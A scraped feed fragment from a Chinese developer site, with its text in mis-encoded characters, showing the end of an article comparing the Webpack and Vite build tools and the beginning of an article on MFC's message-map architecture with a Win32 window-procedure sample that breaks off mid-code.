blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>Webpack</strong> å’Œ <strong>Vite</strong> éƒ½æ˜¯ç”¨äºæ„å»ºç°ä»£å‰ç«¯åº”ç”¨çš„æ„å»ºå·¥å…·ï¼Œå®ƒä»¬åœ¨åŸç†å’Œå®ç°ä¸Šæœ‰æ˜¾è‘—çš„åŒºåˆ«ã€‚ä¸‹é¢æˆ‘å°†è¯¦ç»†æ¯”è¾ƒå®ƒä»¬çš„å¼‚åŒï¼Œå¸®åŠ©ä½ äº†è§£ä¸¤è€…çš„å·¥ä½œåŸç†ä»¥åŠå„è‡ªçš„ä¼˜åŠ¿ã€‚</p>
<hr/>
<h2 data-id="heading-0">âœ… <strong>ä¸€ã€Webpack å’Œ Vite çš„æ ¸å¿ƒåŒºåˆ«</strong></h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Webpack</th><th>Vite</th></tr></thead><tbody><tr><td><strong>æ„å»ºé€Ÿåº¦</strong></td><td>è¾ƒæ…¢ï¼Œç‰¹åˆ«æ˜¯å¤§å‹é¡¹ç›®</td><td>å¿«ï¼Œå‡ ä¹æ˜¯å³æ—¶çš„</td></tr><tr><td><strong>æ„å»ºåŸç†</strong></td><td>é€šè¿‡æ‰“åŒ…æ‰€æœ‰èµ„æºï¼Œç”Ÿæˆæœ€ç»ˆçš„ bundle</td><td>é‡‡ç”¨æŒ‰éœ€ç¼–è¯‘ï¼Œåˆ©ç”¨æµè§ˆå™¨åŸç”Ÿæ”¯æŒ ES æ¨¡å—</td></tr><tr><td><strong>å¼€å‘æ¨¡å¼</strong></td><td>ä¸€å¼€å§‹å°±è¿›è¡Œå…¨éƒ¨çš„æ‰“åŒ…ï¼Œç¼–è¯‘é€Ÿåº¦è¾ƒæ…¢</td><td>é€šè¿‡æµè§ˆå™¨åŸç”Ÿæ”¯æŒ ES Modulesï¼Œåªæœ‰è¯·æ±‚çš„æ¨¡å—æ‰ä¼šè¢«å¤„ç†</td></tr><tr><td><strong>æ„å»ºäº§ç‰©</strong></td><td>ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ª bundle æ–‡ä»¶</td><td>åŸºäº ES Module æŒ‰éœ€åŠ è½½ï¼Œä¸åŒäº Webpack å®Œæ•´çš„æ‰“åŒ…</td></tr><tr><td><strong>æ”¯æŒç±»å‹</strong></td><td>æ”¯æŒæ‰€æœ‰ JavaScriptï¼ŒCSSï¼Œå›¾ç‰‡ï¼Œå­—ä½“ç­‰</td><td>ä¸»è¦æ”¯æŒ ES æ¨¡å—ï¼Œé’ˆå¯¹ç°ä»£æµè§ˆå™¨ä¼˜åŒ–</td></tr><tr><td><strong>ä½¿ç”¨ä½“éªŒ</strong></td><td>é…ç½®å¤æ‚ï¼Œé€‚ç”¨äºå„ç§éœ€æ±‚å’Œä¼˜åŒ–</td><td>é…ç½®ç®€å•ï¼Œé€‚åˆå¿«é€Ÿå¼€å‘ï¼Œä½†åŠŸèƒ½ä¸å¦‚ Webpack çµæ´»</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-1">âœ… <strong>äºŒã€Webpack åŸç†å’Œå®ç°</strong></h2>
<h4 data-id="heading-2"><strong>1. ä¼ ç»Ÿçš„æ‰“åŒ…å·¥å…·</strong></h4>
<p>Webpack æ˜¯ä¸€ä¸ª <strong>æ¨¡å—æ‰“åŒ…å™¨</strong>ï¼Œå®ƒå°†æ‰€æœ‰çš„é™æ€èµ„æºï¼ˆJavaScriptã€CSSã€å›¾ç‰‡ç­‰ï¼‰å½“ä½œæ¨¡å—å¤„ç†ï¼Œå¹¶ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ª bundle æ–‡ä»¶ï¼Œæœ€ç»ˆè¿™äº›æ–‡ä»¶å°†è¢«æµè§ˆå™¨åŠ è½½ã€‚</p>
<h4 data-id="heading-3"><strong>2. æ‰“åŒ…è¿‡ç¨‹ï¼š</strong></h4>
<p>Webpack çš„æ‰“åŒ…è¿‡ç¨‹ä¸»è¦åŒ…å«ä»¥ä¸‹å‡ ä¸ªé˜¶æ®µï¼š</p>
<ol>
<li>
<p><strong>è§£æé˜¶æ®µï¼ˆParsingï¼‰</strong></p>
<ul>
<li>Webpack ä»å…¥å£æ–‡ä»¶ï¼ˆentryï¼‰å¼€å§‹ï¼Œé€’å½’åœ°è§£ææ¯ä¸€ä¸ªä¾èµ–ï¼Œç”Ÿæˆä¾èµ–å›¾ã€‚</li>
<li>åœ¨è§£ææ—¶ï¼ŒWebpack ä¼šè°ƒç”¨ <strong>loader</strong> å¯¹ä¸åŒç±»å‹çš„æ–‡ä»¶è¿›è¡Œé¢„å¤„ç†ï¼ˆå¦‚ Babel è½¬è¯‘ã€Sass ç¼–è¯‘ç­‰ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ„å»ºé˜¶æ®µï¼ˆBuildingï¼‰</strong></p>
<ul>
<li>Webpack ä¼šé€šè¿‡ <strong>loader</strong> å’Œ <strong>plugin</strong> å¤„ç†æ‰€æœ‰æ¨¡å—ï¼Œç”Ÿæˆæœ€ç»ˆçš„ <strong>ASTï¼ˆæŠ½è±¡è¯­æ³•æ ‘ï¼‰</strong> ã€‚</li>
<li>ä½¿ç”¨ <strong>module bundling</strong> å°†æ‰€æœ‰æ¨¡å—åˆå¹¶æˆä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ï¼ˆbundleï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>ä¼˜åŒ–é˜¶æ®µï¼ˆOptimizationï¼‰</strong></p>
<ul>
<li>Webpack ä¼šå¯¹ç”Ÿæˆçš„ bundle è¿›è¡Œä¼˜åŒ–ï¼Œå¦‚ï¼šåˆ†å‰²ä»£ç ï¼ˆCode Splittingï¼‰ã€å‹ç¼©ï¼ˆTerserï¼‰ç­‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>è¾“å‡ºé˜¶æ®µï¼ˆOutputï¼‰</strong></p>
<ul>
<li>æœ€ç»ˆå°† bundle è¾“å‡ºåˆ°æŒ‡å®šçš„ç›®å½•ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„æ–‡ä»¶ä¾›æµè§ˆå™¨ä½¿ç”¨ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-4"><strong>3. Webpack éœ€è¦æ—¶é—´æ‰“åŒ…æ‰€æœ‰èµ„æº</strong></h4>
<p>ç”±äº Webpack ä¼šå°†æ‰€æœ‰èµ„æºéƒ½æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ªæ–‡ä»¶ï¼Œæ‰€ä»¥å½“ä½ åš <code>webpack --mode development</code> å‘½ä»¤æ—¶ï¼Œå®ƒå¿…é¡»ç¼–è¯‘æ‰€æœ‰æ–‡ä»¶ï¼Œè¿™å°±å¯¼è‡´å¼€å‘è¿‡ç¨‹ä¸­å¯åŠ¨æ—¶é—´è¾ƒé•¿ã€‚</p>
<hr/>
<h2 data-id="heading-5">âœ… <strong>ä¸‰ã€Vite åŸç†å’Œå®ç°</strong></h2>
<h4 data-id="heading-6"><strong>1. åŸºäºæµè§ˆå™¨åŸç”Ÿæ”¯æŒçš„ ES Modules</strong></h4>
<p>Vite çš„æ ¸å¿ƒåŸç†æ˜¯åˆ©ç”¨æµè§ˆå™¨åŸç”Ÿæ”¯æŒ <strong>ES Modules</strong>ï¼Œå®ƒå¹¶ä¸åƒ Webpack é‚£æ ·è¿›è¡Œå®Œæ•´çš„æ‰“åŒ…ï¼Œè€Œæ˜¯é€šè¿‡ <strong>æŒ‰éœ€åŠ è½½</strong> æ¥æé«˜æ„å»ºé€Ÿåº¦ã€‚</p>
<h4 data-id="heading-7"><strong>2. Vite å¼€å‘æµç¨‹ï¼š</strong></h4>
<p>Vite çš„å¼€å‘è¿‡ç¨‹åˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼š</p>
<h5 data-id="heading-8"><strong>å¼€å‘é˜¶æ®µï¼š</strong></h5>
<ol>
<li>
<p><strong>æŒ‰éœ€ç¼–è¯‘</strong>ï¼š</p>
<ul>
<li>å½“ä½ å¯åŠ¨ Vite æ—¶ï¼Œå®ƒä¸ä¼šä¸€æ¬¡æ€§æ‰“åŒ…æ•´ä¸ªé¡¹ç›®ï¼Œè€Œæ˜¯ä»…å¯¹ <strong>é¦–æ¬¡è¯·æ±‚çš„æ¨¡å—</strong> è¿›è¡Œç¼–è¯‘å’ŒæœåŠ¡ã€‚æ¯”å¦‚ï¼Œåªæœ‰ç”¨æˆ·ç¬¬ä¸€æ¬¡è®¿é—®æŸä¸ªé¡µé¢æ—¶ï¼ŒVite æ‰ä¼šç¼–è¯‘è¯¥é¡µé¢ä¾èµ–çš„ JavaScript å’Œ CSSã€‚</li>
</ul>
</li>
<li>
<p><strong>çƒ­æ¨¡å—æ›¿æ¢ï¼ˆHMRï¼‰</strong> ï¼š</p>
<ul>
<li>Vite æä¾›äº† <strong>å³æ—¶çš„çƒ­æ¨¡å—æ›¿æ¢</strong>ï¼Œå½“ä½ åœ¨å¼€å‘è¿‡ç¨‹ä¸­ä¿®æ”¹äº†æŸä¸ªæ¨¡å—ï¼ŒVite ä¼šåªç¼–è¯‘å¹¶æ›¿æ¢è¯¥æ¨¡å—ï¼Œè€Œä¸æ˜¯é‡æ–°æ‰“åŒ…æ•´ä¸ªé¡¹ç›®ã€‚è¿™å¤§å¤§æé«˜äº†å¼€å‘ä½“éªŒã€‚</li>
</ul>
</li>
</ol>
<h5 data-id="heading-9"><strong>æ„å»ºé˜¶æ®µï¼š</strong></h5>
<ol start="3">
<li>
<p><strong>ç”Ÿäº§æ„å»ºï¼ˆbuildï¼‰</strong> ï¼š</p>
<ul>
<li>åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ï¼ŒVite ä½¿ç”¨ <strong>Rollup</strong>ï¼ˆä¸€ä¸ªç°ä»£çš„ JavaScript æ‰“åŒ…å·¥å…·ï¼‰è¿›è¡Œæœ€ç»ˆçš„æ‰“åŒ…ï¼Œå°†æ‰€æœ‰æ¨¡å—åˆå¹¶æˆä¸€ä¸ªä¼˜åŒ–è¿‡çš„ bundleï¼Œè¿›è¡Œä»£ç æ‹†åˆ†ï¼Œå‹ç¼©ç­‰ä¼˜åŒ–ï¼Œç”Ÿæˆæœ€ç»ˆçš„é™æ€æ–‡ä»¶ã€‚</li>
</ul>
</li>
</ol>
<h4 data-id="heading-10"><strong>3. ä¸éœ€è¦ä¸€ç›´æ‰“åŒ…å…¨éƒ¨èµ„æº</strong></h4>
<p>Vite çš„æŒ‰éœ€ç¼–è¯‘å’Œå¿«é€Ÿå“åº”æœºåˆ¶ï¼Œä½¿å¾—å¼€å‘è¿‡ç¨‹éå¸¸è¿…é€Ÿã€‚åªæœ‰åœ¨é¡µé¢è®¿é—®æ—¶ï¼Œæ‰ä¼šå¤„ç†è¯¥é¡µé¢çš„ä¾èµ–ï¼Œé¿å…äº† Webpack é‚£ç§å®Œå…¨æ‰“åŒ…çš„æ€§èƒ½æ¶ˆè€—ã€‚</p>
<hr/>
<h2 data-id="heading-11">âœ… <strong>å››ã€Webpack ä¸ Vite ä¼˜ç¼ºç‚¹å¯¹æ¯”</strong></h2>








































<table><thead><tr><th>ç‰¹æ€§</th><th>Webpack</th><th>Vite</th></tr></thead><tbody><tr><td><strong>æ„å»ºé€Ÿåº¦</strong></td><td>è¾ƒæ…¢ï¼ˆå°¤å…¶æ˜¯å¤§å‹é¡¹ç›®æ—¶ï¼‰</td><td>æå¿«ï¼Œå°¤å…¶æ˜¯å†·å¯åŠ¨å’Œçƒ­æ›´æ–°</td></tr><tr><td><strong>é…ç½®å¤æ‚æ€§</strong></td><td>é…ç½®è¾ƒä¸ºå¤æ‚ï¼Œéœ€è¦å¤„ç†è®¸å¤šç»†èŠ‚</td><td>é…ç½®ç®€å•ï¼Œå¼€ç®±å³ç”¨ï¼Œå°‘é…ç½®å³å¯</td></tr><tr><td><strong>å¼€å‘ä½“éªŒ</strong></td><td>å¼€å‘ä¸­æ¯æ¬¡æ›´æ”¹éƒ½ä¼šè§¦å‘å®Œæ•´ç¼–è¯‘</td><td>çƒ­æ›´æ–°é€Ÿåº¦å¿«ï¼Œä¿®æ”¹åçš„å†…å®¹å³æ—¶ååº”</td></tr><tr><td><strong>æ”¯æŒçš„åŠŸèƒ½</strong></td><td>åŠŸèƒ½å¼ºå¤§ï¼Œæ”¯æŒçš„æ’ä»¶ä¸°å¯Œï¼Œå‡ ä¹æ— æ‰€ä¸åŒ…</td><td>é€‚åˆç°ä»£å‰ç«¯å¼€å‘ï¼Œç‰¹æ€§è¾ƒä¸ºç®€æ´å’Œèšç„¦</td></tr><tr><td><strong>æ„å»ºäº§ç‰©</strong></td><td>ç”Ÿæˆä¸€ä¸ªæˆ–å¤šä¸ªè¾ƒå¤§çš„ bundle</td><td>ç”Ÿæˆå¤šä¸ªæŒ‰éœ€åŠ è½½çš„å°æ–‡ä»¶</td></tr><tr><td><strong>é€‚ç”¨åœºæ™¯</strong></td><td>é€‚åˆä¸­å¤§å‹å¤æ‚é¡¹ç›®ï¼Œæ”¯æŒæ›´å¤šè‡ªå®šä¹‰éœ€æ±‚</td><td>é€‚åˆä¸­å°å‹é¡¹ç›®ã€ç°ä»£å‰ç«¯æ¡†æ¶ï¼ˆå¦‚ React/Vueï¼‰</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-12">âœ… <strong>äº”ã€æ€»ç»“</strong></h2>
<ol>
<li>
<p><strong>Webpackï¼š</strong></p>
<ul>
<li>é€‚ç”¨äºå¤æ‚çš„å‰ç«¯é¡¹ç›®ï¼Œæ”¯æŒæ’ä»¶å’ŒåŠ è½½å™¨çš„çµæ´»æ‰©å±•ã€‚</li>
<li>åœ¨å¼€å‘æ—¶ï¼Œå¯åŠ¨å’Œçƒ­æ›´æ–°è¾ƒæ…¢ï¼Œå°¤å…¶æ˜¯å¤§å‹é¡¹ç›®ã€‚</li>
<li>é…ç½®å¤æ‚ï¼Œéœ€è¦æ›´å¤šçš„æ‰‹åŠ¨é…ç½®æ¥å®ç°é¡¹ç›®å®šåˆ¶ã€‚</li>
</ul>
</li>
<li>
<p><strong>Viteï¼š</strong></p>
<ul>
<li>æ›´é€‚åˆç°ä»£å‰ç«¯å¼€å‘ï¼Œç‰¹åˆ«æ˜¯å¯¹å¼€å‘é€Ÿåº¦å’Œç”¨æˆ·ä½“éªŒæœ‰é«˜è¦æ±‚çš„åœºæ™¯ã€‚</li>
<li>ä½¿ç”¨æµè§ˆå™¨åŸç”Ÿçš„ ES Modules æ¥å®ç°æŒ‰éœ€ç¼–è¯‘å’Œå³æ—¶çƒ­æ›´æ–°ï¼Œå¼€å‘ä½“éªŒæä½³ã€‚</li>
<li>é€‚ç”¨äºç°ä»£å‰ç«¯æ¡†æ¶ï¼ˆå¦‚ Vueã€Reactï¼‰ï¼Œå¹¶åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨ Rollup è¿›è¡Œé«˜æ•ˆæ„å»ºã€‚</li>
</ul>
</li>
</ol>
<hr/>
<h2 data-id="heading-13">ğŸ“Œ <strong>æ¨èåœºæ™¯ï¼š</strong></h2>
<ul>
<li><strong>Webpack</strong> é€‚åˆ <strong>å¤§å‹ã€å¤æ‚çš„å‰ç«¯é¡¹ç›®</strong>ï¼Œå°¤å…¶æ˜¯æœ‰å¤šç§æŠ€æœ¯æ ˆã€æ¡†æ¶ï¼Œæˆ–è€…éœ€è¦æ›´å¤šè‡ªå®šä¹‰æ„å»ºçš„é¡¹ç›®ã€‚</li>
<li><strong>Vite</strong> æ›´é€‚åˆ <strong>å¿«é€Ÿå¼€å‘ã€ç°ä»£åŒ–å‰ç«¯åº”ç”¨</strong>ï¼Œå°¤å…¶æ˜¯å°å‹æˆ–ä¸­å‹é¡¹ç›®ï¼Œæˆ–è€…æƒ³è¦äº«å—æé€Ÿå¼€å‘ä½“éªŒçš„å›¢é˜Ÿã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MFCæ ¸å¿ƒæ¶æ„æ·±åº¦è§£æ]]></title>    <link>https://juejin.cn/post/7581097111896277046</link>    <guid>https://juejin.cn/post/7581097111896277046</guid>    <pubDate>2025-12-08T10:28:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581097111896277046" data-draft-id="7581210455827365924" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MFCæ ¸å¿ƒæ¶æ„æ·±åº¦è§£æ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T10:28:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MFCæ ¸å¿ƒæ¶æ„æ·±åº¦è§£æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T10:28:39.000Z" title="Mon Dec 08 2025 10:28:39 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»42åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å°½ç®¡MFCï¼ˆMicrosoft Foundation Classesï¼‰å¸¸è¢«è§†ä¸ºâ€œè¿‡æ—¶â€çš„é—ç•™æŠ€æœ¯ï¼Œä½†å…¶è®¾è®¡æ€æƒ³å¯¹ç†è§£Windowsç¼–ç¨‹æœ¬è´¨å’Œæ¡†æ¶è®¾è®¡å“²å­¦ä»å…·é‡è¦ä»·å€¼ã€‚ä½œä¸ºä¸€å¥—ç»å…¸çš„C++æ¡†æ¶ï¼ŒMFCæˆåŠŸå°†è¿‡ç¨‹å¼çš„Win32 APIå°è£…ä¸ºé¢å‘å¯¹è±¡çš„ç±»åº“ï¼Œå…¶æ¶ˆæ¯æ˜ å°„æœºåˆ¶å’Œæ–‡æ¡£/è§†å›¾æ¶æ„ä½“ç°äº†æ—©æœŸæ¡†æ¶è®¾è®¡è€…å¯¹è½¯ä»¶å¤æ‚æ€§çš„æ·±åˆ»æ€è€ƒã€‚æœ¬æ–‡æ—¨åœ¨ç³»ç»Ÿæ€§å‰–æMFCçš„æ ¸å¿ƒæ¶æ„ï¼Œä¸ºå¼€å‘è€…æä¾›ä¸€ä¸ªç»“æ„åŒ–çš„è®¤çŸ¥æ¡†æ¶ã€‚</p>
<h2 data-id="heading-0">ç¬¬ä¸€ç« ï¼šMFCçš„æ¶ˆæ¯æ˜ å°„æœºåˆ¶â€”â€”Windowsäº‹ä»¶é©±åŠ¨çš„é©å‘½æ€§å°è£…</h2>
<h3 data-id="heading-1">ä¸€ã€Win32 SDKçš„åŸå§‹å›°å¢ƒï¼šé›†ä¸­å¼æ¶ˆæ¯å¤„ç†çš„å¤æ‚æ€§</h3>
<p>åœ¨æ·±å…¥ç†è§£MFCçš„æ¶ˆæ¯æ˜ å°„ä¹‹å‰ï¼Œå¿…é¡»é¦–å…ˆå®¡è§†ä¼ ç»ŸWin32 SDKç¼–ç¨‹çš„æ¶ˆæ¯å¤„ç†æ¨¡å¼ã€‚è¿™ç§æ¨¡å¼çš„æ ¸å¿ƒæ˜¯ä¸€ä¸ªé›†ä¸­å¼çš„çª—å£è¿‡ç¨‹å‡½æ•°ï¼ˆWindow Procedureï¼Œç®€ç§°WndProcï¼‰ï¼Œå®ƒæ¥æ”¶å¹¶å¤„ç†å‘é€åˆ°çª—å£çš„æ‰€æœ‰æ¶ˆæ¯ã€‚</p>
<p>å…¸å‹çš„Win32 SDKæ¶ˆæ¯å¤„ç†ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-function">LRESULT CALLBACK <span class="hljs-title">WndProc</span><span class="hljs-params">(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)</span>
</span>{
    <span class="hljs-keyword">switch</span> (message)
    {
        <span class="hljs-keyword">case</span> WM_PAINT:
        {
            PAINTSTRUCT ps;
            HDC hdc = <span class="hljs-built_in">BeginPaint</span>(hWnd, &amp;ps);
            <span class="hljs-comment">// ç»˜å›¾ä»£ç ...</span>
            <span class="hljs-built_in">EndPaint</span>(hWnd, &amp;ps);
        }
        <span class="hljs-keyword">break</span>;
        
        <span class="hljs-keyword">case</span> WM_MOUSEMOVE:
        {
            <span class="hljs-type">int</span> xPos = <span class="hljs-built_in">LOWORD</span>(lParam);
            <span class="hljs-type">int</span> yPos = <span class="hljs-built_in">HIWORD</span>(lParam);
            <span class="hljs-comment">// å¤„ç†é¼ æ ‡ç§»åŠ¨...</span>
        }
        <span class="hljs-keyword">break</span>;
        
        <span class="hljs-keyword">case</span> WM_COMMAND:
        {
            <span class="hljs-type">int</span> wmId = <span class="hljs-built_in">LOWORD</span>(wParam);
            <span class="hljs-keyword">switch</span> (wmId)
            {
                <span class="hljs-keyword">case</span> IDM_FILE_OPEN:
                    <span class="hljs-comment">// å¤„ç†æ–‡ä»¶æ‰“å¼€...</span>
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> IDM_FILE_SAVE:
                    <span class="hljs-comment">// å¤„ç†æ–‡ä»¶ä¿å­˜...</span>
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-comment">// æ›´å¤šèœå•é¡¹...</span>
            }
        }
        <span class="hljs-keyword">break</span>;
        
        <span class="hljs-keyword">case</span> WM_DESTROY:
            <span class="hljs-built_in">PostQuitMessage</span>(<span class="hljs-number">0</span>);
            <span class="hljs-keyword">break</span>;
            
        <span class="hljs-keyword">default</span>:
